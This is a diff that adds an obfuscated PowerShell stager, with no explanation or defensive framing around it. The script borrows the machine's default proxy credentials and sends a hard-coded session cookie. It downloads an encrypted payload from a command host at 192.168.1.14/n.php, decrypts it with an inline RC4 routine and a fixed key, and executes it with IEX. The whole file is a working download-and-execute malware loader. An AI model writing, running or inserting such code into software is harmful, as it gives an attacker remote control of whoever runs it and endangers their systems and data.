@@ -1,0 +1,17 @@
+
+$b3904=new-object system.net.webclient;
+$t='/n.php';
+$ser='http://192.168.1.14:80';
+$B3904.Headers.Add('User-Agent',$u);
+$B3904.PrOXy=[SYSteM.NEt.WebReqUesT]::DefauLTWeBPRoXy;
+$b3904.PRoXY.credentials = [SYSTEm.NeT.CREdenTiAlCachE]::DEFAuLtNetWorKCREdenTiALS;
+$Script:Proxy = $b3904.Proxy;
+$K=[SysTeM.Text.EncOding]::ASCII.GetByteS('JC&M97StdyV!*}{4X:a-<Hm=hw@Ku+oD');
+$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunt])%256;
+$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;
+$S[$I],$S[$H]=$S[$H],$S[$I];
+$_-bXOR$S[($S[$I]+$S[$H])%256]}};
+$B3904.HeadErs.AdD("Cookie","fqANjYhhYSzSdAn=HBkplW77dZeuvfwsyuFokWTQwII=");
+$DAta=$b3904.DowNLoaDdata($SeR+$t);
+$IV=$DaTA[0..3];
+$DATA=$datA[4..$daTA.LenGTh];-JOiN[CHAr[]](& $R $data ($IV+$K))|IEX
